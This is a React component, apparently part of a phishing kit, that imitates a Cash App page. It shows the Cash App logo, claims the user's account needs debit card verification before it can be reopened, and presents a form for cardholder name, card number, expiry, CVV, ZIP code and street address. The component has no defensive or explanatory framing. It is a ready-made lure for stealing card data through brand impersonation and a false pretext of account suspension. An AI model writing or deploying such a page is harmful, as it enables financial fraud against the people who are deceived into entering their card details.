export default function CardForm() {
  return (
    <div className="container">
      <div className="card">
        {/* Logo */}
        <h1 className="logo">
          <svg
            aria-label="Cash App Logo"
            role="img"
            width="148"
            height="32"
            viewBox="0 0 148 32"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
            data-testid="header-logo"
          >
            <title>Cash App</title>
            <path
              d="M48.8685 21.6076C50.56 21.6076 51.84 20.6324 52.3733 19.0019..."
              fill="#000000"
            ></path>
          </svg>
        </h1>

        {/* Title */}
        <h2 className="title">Verify your debit card linked to your account.</h2>
        <p className="subtitle">
          Complete the account information verification process to reopen your
          Cash App account.
        </p>

        {/* Form */}
        <form className="form">
          <input type="text" placeholder="Cardholder Name" className="input" />
          <input
            type="text"
            placeholder="0000 0000 0000 0000"
            className="input"
          />

          {/* Row Expiry, CVV, ZIP */}
          <div className="row triple">
            <input type="text" placeholder="MM/YY" className="input" />
            <input type="text" placeholder="123" className="input" />
            <input type="text" placeholder="12345" className="input" />
          </div>

          <input
            type="text"
            placeholder="Street Address"
            className="input"
          />

          <div className="row">
            <input type="text" placeholder="City" className="input" />
            <input type="text" placeholder="State" className="input" />
          </div>

          {/* Buttons */}
          <div className="buttons">
            <button type="button" className="skip">
              Skip
            </button>
            <button type="submit" className="continue">
              Continue
            </button>
          </div>
        </form>
      </div>

      <style jsx>{`
        .container {
          display: flex;
          align-items: center;
          justify-content: center;
          min-height: 100vh; /* full height */
          padding: 16px;
          background: #f5f5f5; /* abu2 muda biar card keliatan */
        }

        .card {
          position: relative;
          width: 100%;
          max-width: 420px;
          padding: 32px 24px;
          background: #fff;
          border-radius: 12px;
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        .logo {
          position: absolute;
          top: 16px;
          left: 16px;
        }

        .title {
          font-size: 20px;
          font-weight: 600;
          margin: 48px 0 8px; /* kasih jarak dari logo */
        }

        .subtitle {
          color: #666;
          font-size: 14px;
          margin-bottom: 24px;
        }

        .form {
          display: flex;
          flex-direction: column;
          gap: 16px;
        }

        .input {
          background: #fff;
          color: #000;
          padding: 12px;
          border-radius: 8px;
          border: 1px solid #ccc;
          outline: none;
          font-size: 14px;
          width: 100%;
        }

        .input::placeholder {
          color: #888;
        }

        .row {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 8px;
        }

        .row.triple {
          grid-template-columns: 1fr 1fr 1fr;
        }

        .buttons {
          display: flex;
          gap: 12px;
          margin-top: 16px;
        }

        .skip,
        .continue {
          flex: 1;
          padding: 12px;
          border-radius: 9999px;
          border: none;
          cursor: pointer;
          font-size: 14px;
          font-weight: 500;
          transition: background 0.2s;
        }

        .skip {
          background: #333;
          color: #fff;
        }

        .skip:hover {
          background: #444;
        }

        .continue {
          background: #22c55e;
          color: #fff;
        }

        .continue:hover {
          background: #16a34a;
        }

        /* Responsive */
        @media (max-width: 480px) {
          .card {
            padding: 20px 16px;
          }
          .row {
            grid-template-columns: 1fr;
          }
          .buttons {
            flex-direction: column;
          }
        }
      `}</style>
    </div>
  );
}
